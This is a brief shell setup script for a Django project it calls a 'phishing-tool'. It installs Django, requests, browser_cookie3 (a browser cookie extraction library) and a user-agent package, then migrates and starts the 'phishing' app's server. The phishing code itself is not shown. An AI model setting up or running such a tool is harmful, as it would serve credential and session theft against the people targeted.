echo ----------phishing-tool----------
echo "*** hello freind ***"
echo 'install python3 and pip before using this tool'
echo 'note !'
echo 'change templates directory and static directory in the setting.py file'
echo press enter to continue ...
read continue

python3 -m pip install django
python3 -m pip install requests
python3 -m pip install browser_cookie3
python3 -m pip install django_user_agents

cd phishing
python3 manage.py migrate
python3 manage.py runserver
